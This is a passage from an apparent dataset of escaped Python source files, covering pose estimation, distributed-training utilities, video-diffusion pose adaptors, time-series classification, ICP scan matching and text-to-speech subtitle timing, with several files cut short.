torch.empty((0), device=self.device, dtype=self.dtype)\n        self.recent_aff_params = torch.empty((0), device=self.device, dtype=self.dtype)\n\n        # Storing certain variables for fast queries/visualization\n        self.depth_imgs = None\n\n    def init_prior_vals(self):\n        self.window_full = False\n        self.pose_anchor = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.aff_anchor = torch.empty((0), device=self.device, dtype=self.dtype)\n        self.sparse_log_depth_anchor = torch.empty(\n            (0), device=self.device, dtype=self.dtype\n        )\n\n    # Same as add_keyframe but g",
    "import cv2\nimport numpy as np\nimport torch\nfrom scipy.ndimage.filters import gaussian_filter\nfrom skimage.measure import label\n\nfrom . import util\nfrom .model import handpose_model\n\n\nclass Hand(object):\n    def __init__(self, model_path):\n        self.model = handpose_model()\n        model_dict = util.transfer(self.model, torch.load(model_path))\n        self.model.load_state_dict(model_dict)\n        self.model.eval()\n\n    def to(self, device):\n        self.model.to(device)\n        return self\n\n    def __call__(self, oriImgRaw):\n        device = next(iter(self.model.parameters())).device\n        scale_search = [0.5, 1.0, 1.5, 2.0]\n        # scale_search = [0.5]\n        boxsize = 368\n        stride = 8\n        padValue = 128\n        thre = 0.05\n        multiplier = [x * boxsize for x in scale_search]\n\n        wsize = 128\n        heatmap_avg = np.zeros((wsize, wsize, 22))\n\n        Hr, Wr, Cr = oriImgRaw.shape\n\n        oriImg = cv2.GaussianBlur(oriImgRaw, (0, 0), 0.8)\n\n        for m in range(len(multiplier)):\n            scale = multiplier[m]\n            imageToTest = util.smart_resize(oriImg, (scale, scale))\n\n            imageToTest_padded, pad = util.padRightDownCorner(imageToTest, stride, padValue)\n            im = np.transpose(np.float32(imageToTest_padded[:, :, :, np.newaxis]), (3, 2, 0, 1)) / 256 - 0.5\n            im = np.ascontiguousarray(im)\n\n            data = torch.from_numpy(im).float()\n            data = data.to(device)\n\n            with torch.no_grad():\n                output = self.model(data).cpu().numpy()\n\n            # extract outputs, resize, and remove padding\n            heatmap = np.transpose(np.squeeze(output), (1, 2, 0))  # output 1 is heatmaps\n            heatmap = util.smart_resize_k(heatmap, fx=stride, fy=stride)\n            heatmap = heatmap[:imageToTest_padded.shape[0] - pad[2], :imageToTest_padded.shape[1] - pad[3], :]\n            heatmap = util.smart_resize(heatmap, (wsize, wsize))\n\n            heatmap_avg += heatmap / len(multiplier)\n\n        all_peaks = []\n        for part in range(21):\n            map_ori = heatmap_avg[:, :, part]\n            one_heatmap = gaussian_filter(map_ori, sigma=3)\n            binary = np.ascontiguousarray(one_heatmap > thre, dtype=np.uint8)\n\n            if np.sum(binary) == 0:\n                all_peaks.append([0, 0])\n                continue\n            label_img, label_numbers = label(binary, return_num=True, connectivity=binary.ndim)\n            max_index = np.argmax([np.sum(map_ori[label_img == i]) for i in range(1, label_numbers + 1)]) + 1\n            label_img[label_img != max_index] = 0\n            map_ori[label_img == 0] = 0\n\n            y, x = util.npmax(map_ori)\n            y = int(float(y) * float(Hr) / float(wsize))\n            x = int(float(x) * float(Wr) / float(wsize))\n            all_peaks.append([x, y])\n        return np.array(all_peaks)\n\nif __name__ == \"__main__\":\n    hand_estimation = Hand('../model/hand_pose_model.pth')\n\n    # test_image = '../images/hand.jpg'\n    test_image = '../images/hand.jpg'\n    oriImg = cv2.imread(test_image)  # B,G,R order\n    peaks = hand_estimation(oriImg)\n    canvas = util.draw_handpose(oriImg, peaks, True)\n    cv2.imshow('', canvas)\n    cv2.waitKey(0)",
    "import os\n\nimport torch\nimport torch.distributed as dist\n\ntry:\n    import horovod.torch as hvd\nexcept ImportError:\n    hvd = None\n\n\ndef is_global_master(args):\n    return args.rank == 0\n\n\ndef is_local_master(args):\n    return args.local_rank == 0\n\n\ndef is_master(args, local=False):\n    return is_local_master(args) if local else is_global_master(args)\n\n\ndef is_using_horovod():\n    # NOTE w/ horovod run, OMPI vars should be set, but w/ SLURM PMI vars will be set\n    # Differentiating between horovod and DDP use via SLURM may not be possible, so horovod arg still required...\n    ompi_vars = [\"OMPI_COMM_WORLD_RANK\", \"OMPI_COMM_WORLD_SIZE\"]\n    pmi_vars = [\"PMI_RANK\", \"PMI_SIZE\"]\n    if all([var in os.environ for var in ompi_vars]) or all([var in os.environ for var in pmi_vars]):\n        return True\n    else:\n        return False\n\n\ndef is_using_distributed():\n    if 'WORLD_SIZE' in os.environ:\n        return int(os.environ['WORLD_SIZE']) > 1\n    if 'SLURM_NTASKS' in os.environ:\n        return int(os.environ['SLURM_NTASKS']) > 1\n    return False\n\n\ndef world_info_from_env():\n    local_rank = 0\n    for v in ('LOCAL_RANK', 'MPI_LOCALRANKID', 'SLURM_LOCALID', 'OMPI_COMM_WORLD_LOCAL_RANK'):\n        if v in os.environ:\n            local_rank = int(os.environ[v])\n            break\n    global_rank = 0\n    for v in ('RANK', 'PMI_RANK', 'SLURM_PROCID', 'OMPI_COMM_WORLD_RANK'):\n        if v in os.environ:\n            global_rank = int(os.environ[v])\n            break\n    world_size = 1\n    for v in ('WORLD_SIZE', 'PMI_SIZE', 'SLURM_NTASKS', 'OMPI_COMM_WORLD_SIZE'):\n        if v in os.environ:\n            world_size = int(os.environ[v])\n            break\n\n    return local_rank, global_rank, world_size\n\n\ndef init_distributed_device(args):\n    # Distributed training = training on more than one GPU.\n    # Works in both single and multi-node scenarios.\n    args.distributed = False\n    args.world_size = 1\n    args.rank = 0  # global rank\n    args.local_rank = 0\n    if args.horovod:\n        assert hvd is not None, \"Horovod is not installed\"\n        hvd.init()\n        args.local_rank = int(hvd.local_rank())\n        args.rank = hvd.rank()\n        args.world_size = hvd.size()\n        args.distributed = True\n        os.environ['LOCAL_RANK'] = str(args.local_rank)\n        os.environ['RANK'] = str(args.rank)\n        os.environ['WORLD_SIZE'] = str(args.world_size)\n    elif is_using_distributed():\n        if 'SLURM_PROCID' in os.environ:\n            # DDP via SLURM\n            args.local_rank, args.rank, args.world_size = world_info_from_env()\n            # SLURM var -> torch.distributed vars in case needed\n            os.environ['LOCAL_RANK'] = str(args.local_rank)\n            os.environ['RANK'] = str(args.rank)\n            os.environ['WORLD_SIZE'] = str(args.world_size)\n            torch.distributed.init_process_group(\n                backend=args.dist_backend,\n                init_method=args.dist_url,\n                world_size=args.world_size,\n                rank=args.rank,\n            )\n        else:\n            # DDP via torchrun, torch.distributed.launch\n            args.local_rank, _, _ = world_info_from_env()\n            torch.distributed.init_process_group(\n                backend=args.dist_backend,\n                init_method=args.dist_url)\n            args.world_size = torch.distributed.get_world_size()\n            args.rank = torch.distributed.get_rank()\n        args.distributed = True\n\n    if torch.cuda.is_available():\n        if args.distributed and not args.no_set_device_rank:\n            device = 'cuda:%d' % args.local_rank\n        else:\n            device = 'cuda:0'\n        torch.cuda.set_device(device)\n    else:\n        device = 'cpu'\n    args.device = device\n    device = torch.device(device)\n    return device\n\n\ndef broadcast_object(args, obj, src=0):\n    # broadcast a pickle-able python object from rank-0 to all ranks\n    if args.horovod:\n        return hvd.broadcast_object(obj, root_rank=src)\n    else:\n        if args.rank == src:\n            objects = [obj]\n        else:\n            objects = [None]\n        dist.broadcast_object_list(objects, src=src)\n        return objects[0]\n\n\ndef all_gather_object(args, obj, dst=0):\n    # gather a pickle-able python object across all ranks\n    if args.horovod:\n        return hvd.allgather_object(obj)\n    else:\n        objects = [None for _ in range(args.world_size)]\n        dist.all_gather_object(objects, obj)\n        return objects\n",
    "import math\nimport torch\nimport torch.nn as nn\nfrom einops import rearrange\nfrom cameractrl.models.motion_module import TemporalTransformerBlock\n\n\ndef get_parameter_dtype(parameter: torch.nn.Module):\n    try:\n        params = tuple(parameter.parameters())\n        if len(params) > 0:\n            return params[0].dtype\n\n        buffers = tuple(parameter.buffers())\n        if len(buffers) > 0:\n            return buffers[0].dtype\n\n    except StopIteration:\n        # For torch.nn.DataParallel compatibility in PyTorch 1.5\n\n        def find_tensor_attributes(module: torch.nn.Module) -> List[Tuple[str, Tensor]]:\n            tuples = [(k, v) for k, v in module.__dict__.items() if torch.is_tensor(v)]\n            return tuples\n\n        gen = parameter._named_members(get_members_fn=find_tensor_attributes)\n        first_tuple = next(gen)\n        return first_tuple[1].dtype\n\n\ndef conv_nd(dims, *args, **kwargs):\n    \"\"\"\n    Create a 1D, 2D, or 3D convolution module.\n    \"\"\"\n    if dims == 1:\n        return nn.Conv1d(*args, **kwargs)\n    elif dims == 2:\n        return nn.Conv2d(*args, **kwargs)\n    elif dims == 3:\n        return nn.Conv3d(*args, **kwargs)\n    raise ValueError(f\"unsupported dimensions: {dims}\")\n\n\ndef avg_pool_nd(dims, *args, **kwargs):\n    \"\"\"\n    Create a 1D, 2D, or 3D average pooling module.\n    \"\"\"\n    if dims == 1:\n        return nn.AvgPool1d(*args, **kwargs)\n    elif dims == 2:\n        return nn.AvgPool2d(*args, **kwargs)\n    elif dims == 3:\n        return nn.AvgPool3d(*args, **kwargs)\n    raise ValueError(f\"unsupported dimensions: {dims}\")\n\n\nclass PoseAdaptor(nn.Module):\n    def __init__(self, unet, pose_encoder):\n        super().__init__()\n        self.unet = unet\n        self.pose_encoder = pose_encoder\n\n    def forward(self, noisy_latents, timesteps, encoder_hidden_states, pose_embedding):\n        assert pose_embedding.ndim == 5\n        bs = pose_embedding.shape[0]            # b c f h w\n        pose_embedding_features = self.pose_encoder(pose_embedding)      # bf c h w\n        pose_embedding_features = [rearrange(x, '(b f) c h w -> b c f h w', b=bs)\n                                   for x in pose_embedding_features]\n        noise_pred = self.unet(noisy_latents,\n                               timesteps,\n                               encoder_hidden_states,\n                               pose_embedding_features=pose_embedding_features).sample\n        return noise_pred\n\n\nclass Downsample(nn.Module):\n    \"\"\"\n    A downsampling layer with an optional convolution.\n    :param channels: channels in the inputs and outputs.\n    :param use_conv: a bool determining if a convolution is applied.\n    :param dims: determines if the signal is 1D, 2D, or 3D. If 3D, then\n                 downsampling occurs in the inner-two dimensions.\n    \"\"\"\n\n    def __init__(self, channels, use_conv, dims=2, out_channels=None, padding=1):\n        super().__init__()\n        self.channels = channels\n        self.out_channels = out_channels or channels\n        self.use_conv = use_conv\n        self.dims = dims\n        stride = 2 if dims != 3 else (1, 2, 2)\n        if use_conv:\n            self.op = conv_nd(dims, self.channels, self.out_channels, 3, stride=stride, padding=padding)\n        else:\n            assert self.channels == self.out_channels\n            self.op = avg_pool_nd(dims, kernel_size=stride, stride=stride)\n\n    def forward(self, x):\n        assert x.shape[1] == self.channels\n        return self.op(x)\n\n\nclass ResnetBlock(nn.Module):\n\n    def __init__(self, in_c, out_c, down, ksize=3, sk=False, use_conv=True):\n        super().__init__()\n        ps = ksize // 2\n        if in_c != out_c or sk == False:\n            self.in_conv = nn.Conv2d(in_c, out_c, ksize, 1, ps)\n        else:\n            self.in_conv = None\n        self.block1 = nn.Conv2d(out_c, out_c, 3, 1, 1)\n        self.act = nn.ReLU()\n        self.block2 = nn.Conv2d(out_c, out_c, ksize, 1, ps)\n        if sk == False:\n            self.skep = nn.Conv2d(in_c, out_c, ksize, 1, ps)\n        else:\n            self.skep = None\n\n        self.down = down\n        if self.down == True:\n            self.down_opt = Downsample(in_c, use_conv=use_conv)\n\n    def forward(self, x):\n        if self.down == True:\n            x = self.down_opt(x)\n        if self.in_conv is not None:  # edit\n            x = self.in_conv(x)\n\n        h = self.block1(x)\n        h = self.act(h)\n        h = self.block2(h)\n        if self.skep is not None:\n            return h + self.skep(x)\n        else:\n            return h + x\n\n\nclass PositionalEncoding(nn.Module):\n    def __init__(\n            self,\n            d_model,\n            dropout=0.,\n            max_len=32,\n    ):\n        super().__init__()\n        self.dropout = nn.Dropout(p=dropout)\n        position = torch.arange(max_len).unsqueeze(1)\n        div_term = torch.exp(torch.arange(0, d_model, 2) * (-math.log(10000.0) / d_model))\n        pe = torch.zeros(1, max_len, d_model)\n        pe[0, :, 0::2, ...] = torch.sin(position * div_term)\n        pe[0, ",
    "from utils.utils import generate_results_csv\nfrom utils.utils import create_directory\nfrom utils.utils import read_dataset\nfrom utils.utils import transform_mts_to_ucr_format\nfrom utils.utils import visualize_filter\nfrom utils.utils import viz_for_survey_paper\nfrom utils.utils import viz_cam\nimport os\nimport numpy as np\nimport sys\nimport sklearn\nimport utils\nfrom utils.constants import CLASSIFIERS\nfrom utils.constants import ARCHIVE_NAMES\nfrom utils.constants import ITERATIONS\nfrom utils.utils import read_all_datasets\n\n\ndef fit_classifier():\n    x_train = datasets_dict[dataset_name][0]\n    y_train = datasets_dict[dataset_name][1]\n    x_test = datasets_dict[dataset_name][2]\n    y_test = datasets_dict[dataset_name][3]\n\n    nb_classes = len(np.unique(np.concatenate((y_train, y_test), axis=0)))\n\n    # transform the labels from integers to one hot vectors\n    enc = sklearn.preprocessing.OneHotEncoder(categories='auto')\n    enc.fit(np.concatenate((y_train, y_test), axis=0).reshape(-1, 1))\n    y_train = enc.transform(y_train.reshape(-1, 1)).toarray()\n    y_test = enc.transform(y_test.reshape(-1, 1)).toarray()\n\n    # save orignal y because later we will use binary\n    y_true = np.argmax(y_test, axis=1)\n\n    if len(x_train.shape) == 2:  # if univariate\n        # add a dimension to make it multivariate with one dimension \n        x_train = x_train.reshape((x_train.shape[0], x_train.shape[1], 1))\n        x_test = x_test.reshape((x_test.shape[0], x_test.shape[1], 1))\n\n    input_shape = x_train.shape[1:]\n    classifier = create_classifier(classifier_name, input_shape, nb_classes, output_directory)\n\n    classifier.fit(x_train, y_train, x_test, y_test, y_true)\n\n\ndef create_classifier(classifier_name, input_shape, nb_classes, output_directory, verbose=True):\n    if classifier_name == 'fcn':\n        from classifiers import fcn\n        return fcn.Classifier_FCN(output_directory, input_shape, nb_classes, verbose)\n    if classifier_name == 'mlp':\n        from classifiers import mlp\n        return mlp.Classifier_MLP(output_directory, input_shape, nb_classes, verbose)\n    if classifier_name == 'resnet':\n        from classifiers import resnet\n        return resnet.Classifier_RESNET(output_directory, input_shape, nb_classes, verbose)\n    if classifier_name == 'mcnn':\n        from classifiers import mcnn\n        return mcnn.Classifier_MCNN(output_directory, verbose)\n    if classifier_name == 'tlenet':\n        from classifiers import tlenet\n        return tlenet.Classifier_TLENET(output_directory, verbose)\n    if classifier_name == 'twiesn':\n        from classifiers import twiesn\n        return twiesn.Classifier_TWIESN(output_directory, verbose)\n    if classifier_name == 'encoder':\n        from classifiers import encoder\n        return encoder.Classifier_ENCODER(output_directory, input_shape, nb_classes, verbose)\n    if classifier_name == 'mcdcnn':\n        from classifiers import mcdcnn\n        return mcdcnn.Classifier_MCDCNN(output_directory, input_shape, nb_classes, verbose)\n    if classifier_name == 'cnn':  # Time-CNN\n        from classifiers import cnn\n        return cnn.Classifier_CNN(output_directory, input_shape, nb_classes, verbose)\n    if classifier_name == 'inception':\n        from classifiers import inception\n        return inception.Classifier_INCEPTION(output_directory, input_shape, nb_classes, verbose)\n\n\n############################################### main\n\n# change this directory for your machine\nroot_dir = '/dl-4-tsc/'\n\nif sys.argv[1] == 'run_all':\n    for classifier_name in CLASSIFIERS:\n        print('classifier_name', classifier_name)\n\n        for archive_name in ARCHIVE_NAMES:\n            print('\\tarchive_name', archive_name)\n\n            datasets_dict = read_all_datasets(root_dir, archive_name)\n\n            for iter in range(ITERATIONS):\n                print('\\t\\titer', iter)\n\n                trr = ''\n                if iter != 0:\n                    trr = '_itr_' + str(iter)\n\n                tmp_output_directory = root_dir + '/results/' + classifier_name + '/' + archive_name + trr + '/'\n\n                for dataset_name in utils.constants.dataset_names_for_archive[archive_name]:\n                    print('\\t\\t\\tdataset_name: ', dataset_name)\n\n                    output_directory = tmp_output_directory + dataset_name + '/'\n\n                    create_directory(output_directory)\n\n                    fit_classifier()\n\n                    print('\\t\\t\\t\\tDONE')\n\n                    # the creation of this directory means\n                    create_directory(output_directory + '/DONE')\n\nelif sys.argv[1] == 'transform_mts_to_ucr_format':\n    transform_mts_to_ucr_format()\nelif sys.argv[1] == 'visualize_filter':\n    visualize_filter(root_dir)\nelif sys.argv[1] == 'viz_for_survey_paper':\n    viz_for_survey_paper(root_dir)\nelif sys.argv[1] == 'viz_cam':\n    viz_cam(root_dir)\nelif sys.argv[1] == 'generate_results_csv':\n    res = generate_results_csv('results.csv', root_dir)\n    print(res.to_string())\nelse:\n    # this is the ",
    "#_base_ = ['../../../_base_/default_runtime.py']\n_base_ = ['default_runtime.py']\n\n# runtime\nmax_epochs = 270\nstage2_num_epochs = 30\nbase_lr = 4e-3\ntrain_batch_size = 32\nval_batch_size = 32\n\ntrain_cfg = dict(max_epochs=max_epochs, val_interval=10)\nrandomness = dict(seed=21)\n\n# optimizer\noptim_wrapper = dict(\n    type='OptimWrapper',\n    optimizer=dict(type='AdamW', lr=base_lr, weight_decay=0.05),\n    paramwise_cfg=dict(\n        norm_decay_mult=0, bias_decay_mult=0, bypass_duplicate=True))\n\n# learning rate\nparam_scheduler = [\n    dict(\n        type='LinearLR',\n        start_factor=1.0e-5,\n        by_epoch=False,\n        begin=0,\n        end=1000),\n    dict(\n        # use cosine lr from 150 to 300 epoch\n        type='CosineAnnealingLR',\n        eta_min=base_lr * 0.05,\n        begin=max_epochs // 2,\n        end=max_epochs,\n        T_max=max_epochs // 2,\n        by_epoch=True,\n        convert_to_iter_based=True),\n]\n\n# automatically scaling LR based on the actual training batch size\nauto_scale_lr = dict(base_batch_size=512)\n\n# codec settings\ncodec = dict(\n    type='SimCCLabel',\n    input_size=(288, 384),\n    sigma=(6., 6.93),\n    simcc_split_ratio=2.0,\n    normalize=False,\n    use_dark=False)\n\n# model settings\nmodel = dict(\n    type='TopdownPoseEstimator',\n    data_preprocessor=dict(\n        type='PoseDataPreprocessor',\n        mean=[123.675, 116.28, 103.53],\n        std=[58.395, 57.12, 57.375],\n        bgr_to_rgb=True),\n    backbone=dict(\n        _scope_='mmdet',\n        type='CSPNeXt',\n        arch='P5',\n        expand_ratio=0.5,\n        deepen_factor=1.,\n        widen_factor=1.,\n        out_indices=(4, ),\n        channel_attention=True,\n        norm_cfg=dict(type='SyncBN'),\n        act_cfg=dict(type='SiLU'),\n        init_cfg=dict(\n            type='Pretrained',\n            prefix='backbone.',\n            checkpoint='https://download.openmmlab.com/mmpose/v1/projects/'\n            'rtmpose/cspnext-l_udp-aic-coco_210e-256x192-273b7631_20230130.pth'  # noqa: E501\n        )),\n    head=dict(\n        type='RTMCCHead',\n        in_channels=1024,\n        out_channels=133,\n        input_size=codec['input_size'],\n        in_featuremap_size=(9, 12),\n        simcc_split_ratio=codec['simcc_split_ratio'],\n        final_layer_kernel_size=7,\n        gau_cfg=dict(\n            hidden_dims=256,\n            s=128,\n            expansion_factor=2,\n            dropout_rate=0.,\n            drop_path=0.,\n            act_fn='SiLU',\n            use_rel_bias=False,\n            pos_enc=False),\n        loss=dict(\n            type='KLDiscretLoss',\n            use_target_weight=True,\n            beta=10.,\n            label_softmax=True),\n        decoder=codec),\n    test_cfg=dict(flip_test=True, ))\n\n# base dataset settings\ndataset_type = 'UBody2dDataset'\ndata_mode = 'topdown'\ndata_root = 'data/UBody/'\n\nbackend_args = dict(backend='local')\n\nscenes = [\n    'Magic_show', 'Entertainment', 'ConductMusic', 'Online_class', 'TalkShow',\n    'Speech', 'Fitness', 'Interview', 'Olympic', 'TVShow', 'Singing',\n    'SignLanguage', 'Movie', 'LiveVlog', 'VideoConference'\n]\n\ntrain_datasets = [\n    dict(\n        type='CocoWholeBodyDataset',\n        data_root='data/coco/',\n        data_mode=data_mode,\n        ann_file='annotations/coco_wholebody_train_v1.0.json',\n        data_prefix=dict(img='train2017/'),\n        pipeline=[])\n]\n\nfor scene in scenes:\n    train_dataset = dict(\n        type=dataset_type,\n        data_root=data_root,\n        data_mode=data_mode,\n        ann_file=f'annotations/{scene}/train_annotations.json',\n        data_prefix=dict(img='images/'),\n        pipeline=[],\n        sample_interval=10)\n    train_datasets.append(train_dataset)\n\n# pipelines\ntrain_pipeline = [\n    dict(type='LoadImage', backend_args=backend_args),\n    dict(type='GetBBoxCenterScale'),\n    dict(type='RandomFlip', direction='horizontal'),\n    dict(type='RandomHalfBody'),\n    dict(\n        type='RandomBBoxTransform', scale_factor=[0.5, 1.5], rotate_factor=90),\n    dict(type='TopdownAffine', input_size=codec['input_size']),\n    dict(type='mmdet.YOLOXHSVRandomAug'),\n    dict(\n        type='Albumentation',\n        transforms=[\n            dict(type='Blur', p=0.1),\n            dict(type='MedianBlur', p=0.1),\n            dict(\n                type='CoarseDropout',\n                max_holes=1,\n                max_height=0.4,\n                max_width=0.4,\n                min_holes=1,\n                min_height=0.2,\n                min_width=0.2,\n                p=1.0),\n        ]),\n    dict(type='GenerateTarget', encoder=codec),\n    dict(type='PackPoseInputs')\n]\nval_pipeline = [\n    dict(type='LoadImage', backend_args=backend_args),\n    dict(type='GetBBoxCenterScale'),\n    dict(type='TopdownAffine', input_size=codec['input_size']),\n    dict(type='PackPoseInputs')\n]\n\ntrain_pipeline_stage2 = [\n    dict(type='LoadImage', backend_args=backend_args),\n    dict(type='GetBBoxCenterScale'),\n    dict(type='RandomFlip', direction='horizontal'),\n    dict(type='RandomHalfBody'),\n    dict(\n        ty",
    "#!/usr/bin/env python3\n#\n# MIT License\n# \n# Copyright (c) 2024 Naoki Akai\n# \n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n# \n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n# \n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\nimport sys\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom scipy.spatial import KDTree\n\ndef read_scan_points(file):\n  fp = open(file, 'r')\n  points = []\n  for data in fp:\n    data = data.replace('\\n', '')\n    data = data.split(' ')\n    x = float(data[0])\n    y = float(data[1])\n    points.append([x, y])\n  fp.close()\n  return points\n\ndef compute_mean_and_covariance(points, indices):\n  x = 0.0\n  y = 0.0\n  num = len(indices)\n  for i in range(num):\n    x += points[indices[i]][0]\n    y += points[indices[i]][1]\n\n  mean = [x / float(num), y / float(num)]\n  vxx = 0.0\n  vxy = 0.0\n  vyy = 0.0\n  for i in range(num):\n    dx = points[indices[i]][0] - mean[0]\n    dy = points[indices[i]][1] - mean[1]\n    vxx += dx * dx\n    vxy += dx * dy\n    vyy += dy * dy\n  cov = np.array([[vxx / float(num), vxy / float(num)], \n                  [vxy / float(num), vyy / float(num)]])\n\n  return mean, cov\n\ndef compute_ndt_points(points):\n  N = 10\n  covs = []\n  tree = KDTree(points)\n  for i in range(len(points)):\n    query = np.array([points[i][0], points[i][1]])\n    dists, indices = tree.query(query, k=N)\n    mean, cov = compute_mean_and_covariance(points, indices)\n    points[i][0] = mean[0]\n    points[i][1] = mean[1]\n    covs.append(cov)\n  return points, covs\n\ndef make_transformation_matrix(tx, ty, theta):\n  mat = np.array([\n    [np.cos(theta), -np.sin(theta), tx],\n    [np.sin(theta), np.cos(theta), ty],\n    [0.0, 0.0, 1.0]\n  ])\n  return mat\n\ndef transform_points(mat, points):\n  for i in range(len(points)):\n    point = np.array([points[i][0], points[i][1], 1.0])\n    transformed_point = np.dot(mat, point)\n    points[i] = [transformed_point[0], transformed_point[1]]\n  return points\n\ndef skewd(v):\n  return np.array([v[1], -v[0]])\n\ndef expmap(v):\n  t = v[2]\n  c = np.cos(t)\n  s = np.sin(t)\n  if np.abs(t) < 1e-10:\n    V = np.eye(2)\n  else:\n    a = (1.0 - c) / t\n    V = np.array([[s / t, -a], [a, s / t]])\n  R = np.array([[c, -s], [s, c]])\n  u = np.array([v[0], v[1]])\n  t = np.dot(V, u)\n  T = np.eye(3)\n  T[:2, :2] = R\n  T[0, 2] = t[0]\n  T[1, 2] = t[1]\n  return T\n\ndef plot_points(points1, points2, title, block):\n  # if not hasattr(plot_points, \"first_call\"):\n  #   plot_points.first_call = True\n\n  x1, y1 = zip(*points1)\n  x2, y2 = zip(*points2)\n  plt.clf()\n  plt.xlim(-10.0, 15.0)\n  plt.ylim(-10.0, 15.0)\n  plt.scatter(x2, y2, color='blue', label='Target points', s=20)\n  plt.scatter(x1, y1, color='red', label='Source points', s=10)\n  plt.legend()\n  plt.grid(True)\n  plt.title(title)\n  plt.xlabel('X [m]')\n  plt.ylabel('Y [m]')\n  plt.legend(loc='upper left', fontsize=12)\n  plt.show(block=block)\n  plt.draw()\n  plt.pause(0.2)\n\n  # if plot_points.first_call:\n  #   input(\"Press Enter to continue...\")\n  #   plot_points.first_call = False\n\ndef icp_scan_matching(trans_mat, source_points, target_points):\n  max_iter_num = 30\n  scan_step = 10\n  max_dist = 3.0\n  epsilon = 1e-4\n  kdtree = KDTree(target_points)\n\n  for iter_num in range(max_iter_num):\n    H = np.zeros((3, 3))\n    b = np.zeros(3)\n    R = trans_mat[:2, :2]\n    corresponding_points_num = 0\n\n    for i in range(0, len(source_points), scan_step):\n      point = np.array([source_points[i][0], source_points[i][1], 1.0])\n      transformed_point = np.dot(trans_mat, point)\n      query = [transformed_point[0], transformed_point[1]]\n      dist, idx = kdtree.query(query)\n      if dist > max_dist:\n        continue\n\n      target = target_points[idx]\n      error = np.array([target[0] - query[0], target[1] - query[1], 0.0])\n      v = np.dot(R, skewd(source_points[i]))\n      J = np.zeros((3, 3))\n      J[0:2, 0:2] = -R\n      J[0, 2] = v[0]\n      J[1, 2] = v[1]\n      H += np.dot(J.T, J)\n      b += np.dot(J.T, error)\n      corresponding_points_num += 1\n\n    delta = np.linalg.solve(H, -b)\n    update = np.dot(delta, delta)\n    trans_mat = np.dot(trans_mat, expmap(delta))\n    title = 'ICP scan matching (' ",
    "import asyncio\nimport os.path\nimport re\nimport aiofiles\nimport edge_tts\n\nfrom load_config import get_yaml_config\n\nconfig = get_yaml_config()\nlimit = config[\"audio\"][\"limit\"]\nrole = config[\"audio\"][\"role\"]\nrate = config[\"audio\"][\"rate\"]\nvolume = config[\"audio\"][\"volume\"]\n\n\nasync def spilt_str2(s, t, k=limit):\n    \"\"\"\n    :param s: \u5207\u7247\u6587\u672c\n    :param t: \u5207\u5206\u524d\u65f6\u95f4\n    :param k: \u5207\u5206\u6700\u5927\u5b57\u6570\n    :return:  \u65b0\u7684\u5207\u7247\u4fe1\u606f\n\n    @ samples\n        s = \"\u5e76\u4e14\u89c9\u9192\u5929\u8d4b \u5f97\u5230\u529b\u91cf \u5bf9\u6297\u51f6\u517d \u89c9\u9192\u5929\u8d4b \u4fbf\u662f\u4eba\u4eba\u5728\u5341\u516b\u5c81\u65f6\u80fd\u4ee5\u8840\u8109\u6c9f\u901a\u6c9f\u901a \u89c9\u9192\u5929\u8d4b\"\n        t = \"00:00:35,184 --> 00:00:42,384\"\n        k = 15\n    \"\"\"\n\n    async def time2second(ti):\n        \"\"\"\n        :param ti: \u8f93\u5165\u65f6\u95f4\uff0c \u683c\u5f0f\u793a\u4f8b\uff1a00:02:56,512\n        :return: float\n        \"\"\"\n        a, b, _c = ti.split(\":\")\n        c, d = _c.split(\",\")\n\n        a, b, c, d = int(a), int(b), int(c), int(d)\n\n        second = a * 3600 + b * 60 + c + d / 1000\n\n        return second\n\n    async def second2time(si):\n        hours = int(si // 3600)\n        minutes = int((si % 3600) // 60)\n        seconds = int(si % 60)\n        milliseconds = round((si % 1) * 1000)\n\n        v = \"00\"\n        u = \"000\"\n        a = v[: 2 - len(str(hours))] + str(hours)\n        b = v[: 2 - len(str(minutes))] + str(minutes)\n        c = v[: 2 - len(str(seconds))] + str(seconds)\n        d = u[: 3 - len(str(milliseconds))] + str(milliseconds)\n\n        return f\"{a}:{b}:{c},{d}\"\n\n    ss = s.split(\" \")\n    ss_valid = []\n\n    # todo \u5c06\u6240\u6709\u7247\u6bb5\u8bbe\u7f6e\u6210\u4e0d\u8d85\u8fc715\n    for _ss in ss:\n        if len(_ss) > k:\n\n            # \u66b4\u529b\u622a\u65ad\u51e0\u6bb5\n            e = len(_ss) // k + 1\n            n_e = len(_ss) // e + 1\n\n            for _i in range(e):\n                if _i == e - 1:\n                    ss_valid.append(_ss[n_e * _i :])\n                else:\n                    ss_valid.append(_ss[n_e * _i : n_e * (_i + 1)])\n        else:\n            ss_valid.append(_ss)\n\n    # todo \u7247\u6bb5\u5408\u5e76\n    tmp = \"\"\n    new_ss = []\n    for i in range(len(ss_valid)):\n        tmp += ss_valid[i]\n\n        if i < len(ss_valid) - 1:\n            if len(tmp + ss_valid[i + 1]) > k:\n                new_ss.append(tmp)\n                tmp = \"\"\n            else:\n                continue\n        else:\n            new_ss.append(tmp)\n            tmp = \"\"\n\n    # \u5206\u914d\u65f6\u95f4\u6233\n    t1, t2 = t.split(\"-->\")\n    ft1 = await time2second(t1)\n    ft2 = await time2second(t2)\n    ftd = ft2 - ft1\n\n    # \u8f6c\u6362\u6210\u79d2\u6570\n    all_str = \" \".join(new_ss)\n\n    tt_s = 0\n    line_srt = []\n    for z in new_ss:\n        tt_e = len(z) + tt_s\n\n        # \u6587\u7ae0\u6700\u540e\u4e00\u53e5\u5f02\u5e38\u5904\u7406\n        if len(all_str) * ftd == 0:\n            continue\n\n        t_start = 